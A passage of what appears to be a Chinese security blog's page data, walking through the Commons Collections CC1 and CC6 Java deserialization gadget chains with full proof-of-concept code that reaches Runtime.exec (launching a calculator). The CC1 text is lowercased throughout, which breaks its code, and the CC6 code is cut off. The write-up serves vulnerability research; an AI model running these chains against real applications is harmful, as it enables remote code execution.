null);\nmethod execmethod = clazz.getmethod("exec", string.class);\nexecmethod.invoke(runtime,"calc");\n\n\n1\n2\n3\n4\n5\n\n\n具体为什么要这么写，在另一篇《java反序列化 - 反射》的文章中有说明，这里不在介绍。\n\n\n# 使用invokertransformer执行命令\n\npublic object transform(object input) {\n    if (input == null) {\n        return null;\n    }\n    try {\n        class cls = input.getclass();\n        method method = cls.getmethod(imethodname, iparamtypes);\n        return method.invoke(input, iargs);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n在invokertransformer类的transform方法中，input是我们传入的想要反射的类，通过getclass获取到类对象。然后调用getmethod方法，传入方法名称、参数类型，最后调用方法的invoke，传入执行方法的对象、方法的参数执行该方法。其中方法名称、参数类型、参数均可以在创建invokertransformer对象时，使用构造器设置。对照上面我们自己编写的反射执行系统命令的写法，我们知道input是runtime的对象，imethodname是exec，iparamtypes是string.class，iargs是calc。于是我们就有了如下的写法：\n\ninvokertransformer invokertransformer = new invokertransformer("exec", new class[]{string.class}, new object[]{"calc"});\nclass clazz = runtime.class;\nmethod getruntime = clazz.getmethod("getruntime");\nruntime runtime = (runtime) getruntime.invoke(null);\ninvokertransformer.transform(runtime);\n\n\n1\n2\n3\n4\n5\n\n\n\n# 解决runtime不可序列化的问题\n\n想要序列化一个类，需要这个类实现serializable接口，runtime没有实现该接口，因此无法进行序列化，最终导致无法进行命令执行。因此，我们需要对runtime的写法进行改造：\n\nclass<runtime> clazz = runtime.class;\nmethod runtimemethod = (method) new invokertransformer(\n    "getmethod",\n    new class[]{string.class,class[].class},\n    new object[]{"getruntime",null})\n    .transform(clazz);\nruntime runtime =(runtime) new invokertransformer(\n    "invoke",\n    new class[]{object.class, object[].class},\n    new object[]{null,null})\n    .transform(runtimemethod);\nnew invokertransformer("exec",new class[]{string.class},new object[]{"calc"}).transform(runtime);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n传入的class类对象是可以被反序列化的，因此传入runtime的类对象，利用反射调用类对象的getmethod方法，获取到该方法之后，在利用反射调用getruntime方法对象的invoke方法，获取到runtime对象。最后在利用invokertransformer调用exec方法，调用系统命令。这种方法十分巧妙的解决了runtime对象无法序列化的问题，这种写法在后续的反序列化链中也十分常见。\n\n\n# 包装chainedtransformer\n\n我们上面的写法创建了三个invokertransformer对象，需要每个都执行他的transform方法，这样过于麻烦。transformer接口还有一个实现类chainedtransformer，该类可以将transformer对象数组包装成一个chainedtransformer，调用transform方法时，会链式调用每个transformer对象的transform方法。如下图所示：\n\n\n\n因此，对我们编写的代码进行包装，然后调用transform方法，执行的结果和上面一致：\n\ntransformer[] transformers = new transformer[]{\n    new invokertransformer("getmethod", new class[]{string.class, class[].class}, new object[]{"getruntime", null}),\n    new invokertransformer("invoke", new class[]{object.class, object[].class}, new object[]{null, null}),\n    new invokertransformer("exec", new class[]{string.class}, new object[]{"calc"})\n};\n\nchainedtransformer chainedtransformer = new chainedtransformer(transformers);\n\nchainedtransformer.transform(runtime.class);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n到这之后，我们基本的transformer就算构建完成了，我们需要网上寻找哪里调用过transform方法。\n\n\n# 向上寻找\n\n可以利用idea的find usages找到现有的java源码中调用过该方法的位置，这也是为什么我们需要将sun包下的源码放入jdk目录下的src.zip中。如果没有sun的源码，后面这条链就会断掉。\n\n\n\n在查找的结果中，我们发现org.apache.commons.collections.map.transformedmap类下的checksetvalue方法的valuetransformer对象调用了transform方法。\n\nprotected object checksetvalue(object value) {\n    return valuetransformer.transform(value);\n}\n\n\n1\n2\n3\n\n\n而valuetransformer对象是我们可以控制的。也就是说，如果valuetransformer对象是我们创建的chainedtransformer对象，调用transform方法就可以执行系统命令了。我们先来看一下valuetransformer从哪里来的。\n\nprotected transformedmap(map map, transformer keytransformer, transformer valuetransformer) {\n    super(map);\n    this.keytransformer = keytransformer;\n    this.valuetransformer = valuetransformer;\n}\n\n\n1\n2\n3\n4\n5\n\n\n在这个类的构造器中，valuetransformer是由我们传入的，那么我们是不是就可以调用构造器直接把chainedtransformer的值赋值给valuetransformer呢？是不行的，因为这个构造器是protected的，我们没有办法直接进行调用。那么我们就看一看，是谁调用了这个构造器。\n\n我们找到，在这个类中存在一个public 的静态方法（可以使用类名直接调用）decorate。我们传入该方法的valuetransformer参数，将直接带入到构造器中。\n\npublic static map decorate(map map, transformer keytransformer, transformer valuetransformer) {\n    return new transformedmap(map, keytransformer, valuetransformer);\n}\n\n\n1\n2\n3\n\n\n于是我们可以这样进行构建：\n\nhashmap<object, object> map = new hashmap<>();\nmap.put("aaa","bbb");\nmap<object,object> decoratedmap = transformedmap.decorate(map, null, chainedtransformer);\n\n\n1\n2\n3\n\n\n这样我们就将decoratedmap对象中的chainedtransformer对象赋值为了chainedtransformer。当chainedtransformer调用transform方法，实际上就是chainedtransformer调用transform方法，就会弹出计算器。\n\n于是我们继续向上找，哪里调用了checksetvalue方法。\n\n在org.apache.commons.collections.map.transformedmap类的父类中有一个静态内部类，当我们使用foreach循环遍历map的entity并给entity设置值时会调用checksetvalue方法。setvalue的参数是object类型的对象，该值会传递给checksetvalue方法，最后传递给transform方法。\n\nstatic class mapentry extends abstractmapentrydecorator {\n\n    /** the parent map */\n    private final abstractinputcheckedmapdecorator parent;\n\n    protected mapentry(map.entry entry, abstractinputcheckedmapdecorator parent) {\n        super(entry);\n        this.parent = parent;\n    }\n\n    public object setvalue(object value) {\n        value = parent.checksetvalue(value);\n        return entry.setvalue(value);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n于是我们可以这样构造，遍历装饰过的chainedtransformer对象。并且调用setvalue方法。就可以调用到tansfrom方法。\n\nfor (map.entry entry : decoratedmap.entryset()){\n    entry.setvalue(runtime.class);\n}\n\n\n1\n2\n3\n\n\n至此，我们已经完成了大部分的利用链的寻找，下一步就是寻找哪里调用过setvalue，并且可以控制传入的参数。最好是readobject调用过，这样在进行反序列化的时候就可以直接激活整条利用链了。\n\n我们依然使用idea的find usages寻找，最终在sun包下的sun.reflect.annotation.annotationinvocationhandler的readobject方法中调用了setvalue方法。\n\nprivate void readobject(java.io.objectinputstream s)\n    throws java.io.ioexception, classnotfoundexception {\n    s.defaultreadobject();\n\n    // check to make sure that types have not evolved incompatibly\n\n    annotationtype annotationtype = null;\n    try {\n        annotationtype = annotationtype.getinstance(type);\n    } catch(illegalargumentexception e) {\n        // class is no longer an annotation type; time to punch out\n        throw new java.io.invalidobjectexception("non-annotation type in annotation serial stream");\n    }\n\n    map<string, class<?>> membertypes = annotationtype.membertypes();\n\n    // if there are annotation members without values, that\n    // situation is handled by the invoke method.\n    for (map.entry<string, object> membervalue : membervalues.entryset()) {\n        string name = membervalue.getkey();\n        class<?> membertype = membertypes.get(name);\n        if (membertype != null) {  // i.e. member still exists\n            object value = membervalue.getvalue();\n            if (!(membertype.isinstance(value) ||\n                  value instanceof exceptionproxy)) {\n                membervalue.setvalue(\n                    new annotationtypemismatchexceptionproxy(\n                        value.getclass() + "[" + value + "]").setmember(\n                        annotationtype.members().get(name)));\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n其中的membervalues是可以通过构造方法传递进去的。但是annotationinvocationhandler类并非public，也无法直接获取对象，我们需要使用反射获取到该类的对象。在构造器中传入一个注解类型的类对象，和我们上面构造的decoratedmap，在反序列化的时候就会调用该类的readobject方法，遍历decoratedmap，调用setvalue。\n\nclass<?> clazz = class.forname("sun.reflect.annotation.annotationinvocationhandler");\nconstructor<?> declaredconstructor = clazz.getdeclaredconstructor(class.class, map.class);\ndeclaredconstructor.setaccessible(true);\nobject o = declaredconstructor.newinstance(overide.class, decoratedmap);\n\ndeserialize(o,"test.ser");\nobject serialize = serialize("test.ser");\nsystem.out.println(serialize);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n但是有两点需要注意的是：\n\n 1. 当if判断通过后才能执行\n 2. setvalue的值我们并不可控，并不能传入runtime.class\n\n我们先看一下if判断的问题，if判断membertype不等于null时才继续执行。membertype的值的获取方式是:\n\n1. 获取我们传入的map的key -- 这里是 aaa\n2. 然后获取我们传入的注解类的同名值 --- override中没有参数 因此获取不到\n3. 然后判断获取到的membertype是不是空的 --- 是空的 于是执行不到setvlaue\n\n\n1\n2\n3\n\n\n于是我们需要将最先的hashmap中的aaa修改为一个注解中存在的值，由于overide不存在任何的属性，因此我们修改使用target注解。\n\n……\nmap.put("value","bbb");\n……\nobject o = declaredconstructor.newinstance(target.class, decoratedmap);\n\n\n1\n2\n3\n4\n\n\n这样的话，if判断就可以通过了。\n\n现在来解决第二个问题，我们无法控制setvalue的参数。setvalue的参数是runtime.class类对象，最终需要传递给transform方法。我们无法控制的话，就无法执行命令。解决方法如下：\n\ntransformer接口有另一个实现类：org.apache.commons.collections.functors.constanttransformer\n\n该类在创建时需要传递进去一个object类型的参数，在执行完该类的transform方法之后，会将我们传递进去的参数返回。如果将其置于chainedtransformer最前面，后续的transfrom方法的参数都将是我们设置的object类型的参数。\n\ntransformer[] transformers = new transformer[]{\n    new constanttransformer(runtime.class),\n    new invokertransformer("getmethod", new class[]{string.class, class[].class}, new object[]{"getruntime", null}),\n    new invokertransformer("invoke", new class[]{object.class, object[].class}, new object[]{null, null}),\n    new invokertransformer("exec", new class[]{string.class}, new object[]{"calc"})\n};\n\n\n1\n2\n3\n4\n5\n6\n\n\n解决了上面两个问题，在对最终的对象进行反序列化时，就会调用该对象的readobject方法，然后调用后续的一系列方法，最终执行系统命令。完整的poc如下：\n\npublic class cc1 {\n    public static void main(string[] args) throws exception {\n        transformer[] transformers = new transformer[]{\n            new constanttransformer(runtime.class),\n            new invokertransformer("getmethod", new class[]{string.class, class[].class}, new object[]{"getruntime", null}),\n            new invokertransformer("invoke", new class[]{object.class, object[].class}, new object[]{null, null}),\n            new invokertransformer("exec", new class[]{string.class}, new object[]{"calc"})\n        };\n\n        chainedtransformer chainedtransformer = new chainedtransformer(transformers);\n        hashmap<object, object> map = new hashmap<>();\n        map.put("value","bbb");\n        map<object,object> decoratedmap = transformedmap.decorate(map, null, chainedtransformer);\n        for (map.entry entry : decoratedmap.entryset()){\n            entry.setvalue(runtime.class);\n        }\n\n        class<?> clazz = class.forname("sun.reflect.annotation.annotationinvocationhandler");\n        constructor<?> declaredconstructor = clazz.getdeclaredconstructor(class.class, map.class);\n        declaredconstructor.setaccessible(true);\n        object o = declaredconstructor.newinstance(target.class, decoratedmap);\n\n        deserialize(o,"test.ser");\n        object serialize = serialize("test.ser");\n        system.out.println(serialize);\n\n    }\n\n    private static void deserialize(object o,string filename) throws exception{\n        objectoutputstream objectoutputstream = new objectoutputstream(new fileoutputstream(filename));\n        objectoutputstream.writeobject(o);\n    }\n\n    private static object serialize(string filename) throws exception{\n        objectinputstream ois = new objectinputstream(new fileinputstream(filename));\n        return ois.readobject();\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n我们再来梳理一下调用链：\n\n- 系统存在一个反序列化点\n\t- 传递我们构造的对象， 调用对象的readobject方法进行反序列化\n\t\t- readobject中调用了setvalue方法\n\t\t\t- setvalue方法中调用了checksetvalue方法\n\t\t\t\t- checksetvalue方法中调用transform\n\t\t\t\t\t- transform方法中利用反射执行系统命令\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 基于transformedmap的cc1\n\n在ysoserial中使用的时lazymap，本质上和我们这个类似。并且在ysoserial中大量的使用到了封装。\n\nfinal map lazymap = lazymap.decorate(innermap, transformerchain);\n\n\n1\n\n\n我们可以将我们这个链也用ysoserial的方式实现一遍。\n\npackage ysoserial.payloads;\n\nimport org.apache.commons.collections.transformer;\nimport org.apache.commons.collections.functors.chainedtransformer;\nimport org.apache.commons.collections.functors.constanttransformer;\nimport org.apache.commons.collections.functors.invokertransformer;\nimport org.apache.commons.collections.map.lazymap;\nimport org.apache.commons.collections.map.transformedmap;\nimport ysoserial.payloads.annotation.authors;\nimport ysoserial.payloads.annotation.dependencies;\nimport ysoserial.payloads.annotation.payloadtest;\nimport ysoserial.payloads.util.gadgets;\nimport ysoserial.payloads.util.javaversion;\nimport ysoserial.payloads.util.payloadrunner;\n\nimport java.lang.annotation.target;\nimport java.lang.reflect.constructor;\nimport java.lang.reflect.invocationhandler;\nimport java.util.hashmap;\nimport java.util.map;\n\n@suppresswarnings({"rawtypes", "unchecked"})\n@payloadtest( precondition = "isapplicablejavaversion")\n@dependencies({"commons-collections:commons-collections:3.1"})\n@authors({ authors.frohoff })\npublic class cc1 extends payloadrunner implements objectpayload<invocationhandler> {\n\n\n  @override\n  public invocationhandler getobject(final string command) throws exception {\n\n\n    final transformer[] transformers = new transformer[]{\n      new constanttransformer(runtime.class),\n      new invokertransformer("getmethod", new class[]{string.class, class[].class}, new object[]{"getruntime", null}),\n      new invokertransformer("invoke", new class[]{object.class, object[].class}, new object[]{null, null}),\n      new invokertransformer("exec", new class[]{string.class}, new object[]{command})\n    };\n    final map innermap = new hashmap();\n    innermap.put("value","123");\n\n    final transformer transformerchain = new chainedtransformer(transformers);\n\n    final map transformedmap = transformedmap.decorate(innermap, null ,transformerchain);\n\n    class<?> clazz = class.forname("sun.reflect.annotation.annotationinvocationhandler");\n    constructor<?> declaredconstructor = clazz.getdeclaredconstructor(class.class, map.class);\n    declaredconstructor.setaccessible(true);\n    final invocationhandler handler = (invocationhandler) declaredconstructor.newinstance(target.class, transformedmap);\n\n    return handler;\n  }\n\n\n\n  public static void main(final string[] args) throws exception {\n    payloadrunner.run(commonscollections1.class, args);\n  }\n\n  public static boolean isapplicablejavaversion() {\n    return javaversion.isanninvhuniversalmethodimpl();\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n\n\n然后我们就可以使用ysoserial创建序列化文件了。\n\n\n# java代理\n\n代理设计模式是java中非常常用的设计模式之一。所谓代理设计模式，就是客户端并不直接调用实际的方法，而是生成该类的代理对象，调用代理对象的指定方法，然后再由代理对象去调用实际的对象。类似于中间商。\n\n\n\n代理设计模式有两种实现方式：\n\n * 静态代理\n * 动态代理\n\n\n# 静态代理\n\n静态代理的实现原理是：创建一个接口类，让实际的类和代理类分别去实现这个接口。然后创建代理类的对象，调用代理类中实现的方法，在代理类方法中再调用实际的方法。代码演示如下：\n\n// 接口\npackage com.pwddd.proxy;\n\npublic interface iuser {\n  void show();\n\n  void eat();\n\n  void run();\n}\n\n\n// 具体实现\npackage com.pwddd.proxy;\n\npublic class userimpl implements iuser{\n  @override\n  public void show() {\n    system.out.println("userimpl .... show");\n  }\n\n  @override\n  public void eat() {\n    system.out.println("userimpl .... eat");\n  }\n\n  @override\n  public void run() {\n    system.out.println("userimpl .... run");\n  }\n}\n\n// 代理实现\npackage com.pwddd.proxy;\n\npublic class userproxy implements iuser{\n\n  private userimpl user;\n\n  public userproxy() {\n  }\n\n  public userproxy(userimpl user) {\n    this.user = user;\n  }\n\n  @override\n  public void show() {\n    system.out.println("proxy show");\n    user.show();\n  }\n\n  @override\n  public void eat() {\n    system.out.println("proxy show");\n    user.eat();\n  }\n\n  @override\n  public void run() {\n    system.out.println("proxy show");\n    user.run();\n  }\n}\n\n\n// 测试方法\npackage com.pwddd.proxy;\n\npublic class proxytest {\n  public static void main(string[] args) {\n    userproxy userproxy = new userproxy(new userimpl());\n    userproxy.show();\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n\n\n通过静态代理的方式，当我们想要调用show方法时，实际上调用的是代理类的show方法，在代理类中做相应的处理操作后，在调用实际的方法。这种静态代理的弊端就是当需要代理的类的方法修改时，对应的具体实现和代理类均需要被修改才能正常使用。\n\n下面介绍一种在框架中大量使用的动态代理。\n\n\n# 动态代理\n\n静态代理的类在程序运行之前就进行了编译。而动态代理并不是在java代码中定义的，而是在运行时创建代理类的对象。相比于静态代理， 动态代理的优势在于可以很方便的对代理类的函数进行统一的处理，而不用修改每个代理类中的方法。\n\n在java的java.lang.reflect包下提供了一个proxy类和一个invocationhandler接口，通过这个类和这个接口可以生成jdk动态代理类和动态代理对象。\n\n创建一个执行处理器类实现invocationhandler接口。\n\npackage com.pwddd.proxy.dynamic;\n\nimport java.lang.reflect.invocationhandler;\nimport java.lang.reflect.method;\n\npublic class myinvocationhandler<t> implements invocationhandler {\n\n  t target;\n\n  public myinvocationhandler() {\n  }\n\n  public myinvocationhandler(t target) {\n    this.target = target;\n  }\n\n  @override\n  public object invoke(object proxy, method method, object[] args) throws throwable {\n    system.out.println(method.getname()+"------------------");\n    object object = method.invoke(target, args);\n\n    return object;\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n创建测试动态代理\n\npackage com.pwddd.proxy.dynamic;\n\nimport com.pwddd.proxy.staticproxy.iuser;\nimport com.pwddd.proxy.staticproxy.userimpl;\n\nimport java.lang.reflect.invocationhandler;\nimport java.lang.reflect.proxy;\n\npublic class testdynamicproxy {\n  public static void main(string[] args) {\n    iuser user = new userimpl();\n    invocationhandler handler = new myinvocationhandler<>(user);\n\n    iuser userproxy = (iuser) proxy.newproxyinstance(\n      user.getclass().getclassloader(),\n      user.getclass().getinterfaces(),\n      handler);\n    userproxy.eat();\n\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n我们首先创建了一个invocationhandler类，并且在该类的构造方法中传递进去我们要代理的具体类的对象。重写invoke方法，在该方法中添加代理的方法，并利用反射调用实际类的方法。使用proxy.newproxyinstance创建代理类的对象，使用代理类对象调用方法。\n\n\n# ysoserial的cc1\n\n\n# lazymap\n\n我们在上面说到，ysoserial的cc1使用的是lazymap，而我们构建的链使用的是transformedmap，这两者在哪些地方有区别呢？我们接下来就来看一下。\n\n我们可以看到，lazymap在get方法中调用了transform方法，因此我们可以尝试构造以下代码，测试是否能够执行系统命令。\n\ntransformer[] transformers = new transformer[]{\n    new constanttransformer(runtime.class),\n    new invokertransformer("getmethod", \n                           new class[]{string.class,class[].class}, \n                           new object[]{"getruntime",new class[0]}),\n    new invokertransformer("invoke", \n                           new class[]{object.class,object[].class}, \n                           new object[]{null, new object[0]}),\n    new invokertransformer("exec", \n                           new class[]{string.class},\n                           new string[]{"calc"}),\n};\n\nchainedtransformer chainedtransformer = new chainedtransformer(transformers);\nhashmap<object, object> innermap = new hashmap<>();\ninnermap.put("value", "test");\nmap outermap = lazymap.decorate(innermap, chainedtransformer);\noutermap.get(runtime.getruntime());\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n经过测试，发现是可以进行命令执行的，那么就需要继续往上寻找，哪里调用过set方法。最终在annotationinvokerhandler中的invoke方法中找到了调用：\n\npublic object invoke(object proxy, method method, object[] args) {\n    string member = method.getname();\n    class<?>[] paramtypes = method.getparametertypes();\n\n    // handle object and annotation methods\n    if (member.equals("equals") && paramtypes.length == 1 &&\n        paramtypes[0] == object.class)\n        return equalsimpl(args[0]);\n    if (paramtypes.length != 0)\n        throw new assertionerror("too many parameters for an annotation method");\n\n    switch(member) {\n        case "tostring":\n            return tostringimpl();\n        case "hashcode":\n            return hashcodeimpl();\n        case "annotationtype":\n            return type;\n    }\n\n    // handle annotation member accessors\n    object result = membervalues.get(member);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n但是遗憾的是，在annotationinvokerhandler的readobject方法中并没有调用过invoke方法。那么ysoserial提供的方法是使用动态代理，这样的话如果调用了readobject方法，并且在readobject方法中调用了对象的任意方法，就会触发代理类的invoke方法，导致命令执行。\n\n完整的lazymap cc1链如下：\n\ntransformer[] transformers = new transformer[]{\n  new constanttransformer(runtime.class),\n  new invokertransformer(\n    "getmethod",\n    new class[]{string.class,class[].class},\n    new object[]{"getruntime",new class[0]}\n  ),\n\n  new invokertransformer(\n    "invoke",\n    new class[]{object.class,object[].class},\n    new object[]{null,new object[0]}\n  ),\n\n  new invokertransformer(\n    "exec",\n    new class[]{string.class},\n    new object[]{"/system/applications/calculator.app/contents/macos/calculator"}\n  )\n};\n\nchainedtransformer chainedtransformer = new chainedtransformer(transformers);\nhashmap innermap = new hashmap();\ninnermap.put("value","xxx");\nmap outermap = lazymap.decorate(innermap,chainedtransformer);\n\nclass clazz = class.forname("sun.reflect.annotation.annotationinvocationhandler");\nconstructor constructor = clazz.getdeclaredconstructor(class.class, map.class);\nconstructor.setaccessible(true);\ninvocationhandler instance = (invocationhandler) constructor.newinstance(retention.class, outermap);\n\nmap proxymap = (map) proxy.newproxyinstance(map.class.getclassloader(), new class[]{map.class}, instance);\ninstance = (invocationhandler) constructor.newinstance(retention.class, proxymap);\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# 两个小细节\n\n在运行上述poc的时候，可能会出现同时打开多个计算器。这种问题的原因是我们生成了代理类的对象，那么当每次被代理类的方法被调用时，都会执行代理类的invoke方法，从而导致弹出计算器。ysoserial为了避免这个问题，特意将transformers数组最后才放置到transformerchains中。\n\n\n\n另外一个就是ysoserial的transformer数组在最终添加了一个constanttransformer(1)。根据p神在java安全漫谈中的解释，是为了隐藏异常日志中的一些信息。我们这里不做深究。\n\n\n# 参考资料\n\n代码审计知识星球 - java安全漫谈：https://wx.zsxq.com/dweb2/index/group/2212251881\n\n白日梦组长 bilibili ： https://space.bilibili.com/2142877265',charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"CC6分析",frontmatter:{title:"CC6分析",date:"2022-03-20T00:00:00.000Z",permalink:"/sec/vuln/deserialization/cc6",author:{name:"p0jo",link:"https://wiki.pwddd.com"},titleTag:"原创",categories:["漏洞原理","反序列化漏洞"],tags:["反序列化","CC","ysoserial"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/201.%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/2010.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/03.CC6%E5%88%86%E6%9E%90.html",relativePath:"02.安全/201.漏洞原理/2010.反序列化漏洞/03.CC6分析.md",key:"v-0c9de936",path:"/sec/vuln/deserialization/cc6/",headers:[{level:2,title:"背景",slug:"背景",normalizedTitle:"背景",charIndex:16},{level:2,title:"利用链分析",slug:"利用链分析",normalizedTitle:"利用链分析",charIndex:6}],headersStr:"背景 利用链分析",content:'# CC6 利用链分析\n\n\n# 背景\n\n我们在分析CC1时使用的jdk版本时8u65，如果使用高于8u71版本的jdk则无法利用CC1链。这是因为在高版本的jdk中改进了AnnotationInvocationHandler的readObject方法的利用逻辑。在ysoserial中，CC6解决了高版本jdk无法使用的问题，是ysoserial比较通用和全能的一条链。但是这条利用链还是需要依靠CommonsCollections3.2.2以下的版本。\n\n\n# 利用链分析\n\n我们在CC1中分析过，ysoserial中使用的LazyMap和我们使用的TransformedMap有一点区别，lazyMap使用的是AnnotationInvokerHandler的invoke方法调用其set方法。而要执行invoke方法需要包装一个动态代理对象。而本次的CC6链同样是调用lazyMap实现的，后面的都是一致的，只是入口到set方法位置不一致。下面是CC6的调用链。\n\n\tGadget chain:\n\t    java.io.ObjectInputStream.readObject()\n            java.util.HashSet.readObject()\n                java.util.HashMap.put()\n                java.util.HashMap.hash()\n                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()\n                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()\n                        org.apache.commons.collections.map.LazyMap.get()\n                            org.apache.commons.collections.functors.ChainedTransformer.transform()\n                            org.apache.commons.collections.functors.InvokerTransformer.transform()\n                            java.lang.reflect.Method.invoke()\n                                java.lang.Runtime.exec()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n从LazyMap的get开始，向上寻找哪里调用了get方法，并且我们参数可控。根据这条gadget chain，我们找到了TiedMapEntry.getValue方法。在getValue中调用了map的get方法。而map是可以通过有参构造传入的。\n\n\n\n我们尝试构造一下：\n\npackage com.pwddd.cc6;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.util.Calendar;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CC6 {\n    public static void main(String[] args) {\n\n        // 1. chains\n        Transformer[] transformers = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\n                        "getMethod",\n                        new Class[]{String.class,Class[].class},\n                        new Object[]{"getRuntime",null}\n                ),\n                new InvokerTransformer(\n                        "invoke",\n                        new Class[]{Object.class, Object[].class},\n                        new Object[]{null, null}\n                ),\n                new InvokerTransformer(\n                        "exec",\n                        new Class[]{String.class},\n                        new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}\n                )\n        };\n\n        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n\n        HashMap<Object, Object> map = new HashMap<>();\n        Map lazyMap = LazyMap.decorate(map, chainedTransformer);\n        // lazyMap.get("bbb");\n        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "aaa");\n        tiedMapEntry.getValue();\n        \n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n上面的代码基本都是类似的，后面使用tiedMapEntity封装了lazyMap，并调用getValue方法。能够执行相应的结果。\n\n\n\n既然到tiedMapEntity这一步能够执行，就需要继续寻找哪里调用了getValue方法。在tiedMapEntity中的hashCode方法中调用了getValue方法。hashCode方法我们已经很熟悉了，在URLDNS中，也是利用了HashMap的hashCode方法。\n\n\n\n那么我再次尝试调用一下：\n\nTiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "aaa");\n//        tiedMapEntry.getValue();\ntiedMapEntry.hashCode();\n\n\n1\n2\n3\n\n\n发现是可以的，那么哪里又调用了hashCode方法，并且调用hashCode的对象我们可以控制呢？\n\n在URLDNS中，我们知道HashMap中的hash方法会对我们传入的key做hash，会掉用key的hashCode方法。因此只需要将tiedMapEntity作为HashMap的key即可。\n\nHashMap<Object, Object> hashMap = new HashMap<>();\nhashMap.put(tiedMapEntry,"bbb");\n\n\n1\n2\n\n\n在put时也会弹出计算器，这是因为在hashMap的put方法中也会计算key的hash值，我们可以先不将我们的chainedTransformer封装进去，这样就无法调用了。\n\nMap lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));\n\nClass<LazyMap> clazz = LazyMap.class;\nField factory = clazz.getDeclaredField("factory");\nfactory.setAccessible(true);\nfactory.set(lazyMap,transformers);\n\n\n1\n2\n3\n4\n5\n6\n\n\n我们尝试将生成的对象序列化之后，再反序列化。仍然无法弹出计算器。我们跟踪一下代码看一下：\n\n\n\n我们看到当执行到这里的时候，map中已经有key为aaa的数据了，那么就不会执行下面的transform方法。因此我们需要把aaa的key移除，这样在反序列化的时候，map里面没有对应的key才可以执行。\n\n完整的代码如下：\n\npublic static void main(String[] args) throws Exception {\n\n  // 1. chains\n  Transformer[] transformers = new Transformer[]{\n    new ConstantTransformer(Runtime.class),\n    new InvokerTransformer(\n      "getMethod",\n      new Class[]{String.class,Class[].class},\n      new Object[]{"getRuntime",null}\n    ),\n    new InvokerTransformer(\n      "invoke",\n      new Class[]{Object.class, Object[].class},\n      new Object[]{null, null}\n    ),\n    new InvokerTransformer(\n      "exec",\n      new Class[]{String.class},\n      new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}\n    )\n  };\n\n  ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);\n\n  HashMap<Object, Object> map = new HashMap<>();\n  Map lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));\n\n  TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "aaa");\n\n  HashMap<Object, Object> hashMap = new HashMap<>();\n  hashMap.put(tiedMapEntry, "bbb");\n  